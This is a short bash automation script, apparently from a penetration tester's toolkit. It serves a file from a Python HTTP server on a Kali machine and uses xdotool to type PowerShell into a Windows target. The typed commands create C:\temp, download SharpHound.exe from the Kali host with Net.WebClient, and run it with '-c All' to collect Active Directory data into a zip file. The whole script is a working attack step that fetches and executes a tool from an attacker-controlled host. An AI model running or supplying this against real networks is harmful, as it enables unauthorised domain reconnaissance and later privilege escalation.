#!/bin/bash

: '
ps: Upload sharphound and execute
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "Zipfilename"

ZIP_FILENAME=${form_data["Zipfilename"]}

cd ~/Desktop/base/code/xdotool/scripts/windows/bloodhound/.files
python3 -m http.server 1337 &
HTTP_PID=$!

TMP_FOLDER="C:\temp"

paste_command "New-Item -Path \"c:\\\" -Name "temp" -ItemType \"directory\""
xdotool key Return
sleep 0.8

paste_command "(New-Object Net.WebClient).DownloadFileAsync('http://${KALI_IP}:1337/SharpHound.exe', '${TMP_FOLDER}\SharpHound.exe')"
xdotool key Return
sleep 2

paste_command "${TMP_FOLDER}\SharpHound.exe -c All --zipfilename ${ZIP_FILENAME}"
xdotool key Return

sleep 60
kill $HTTP_PID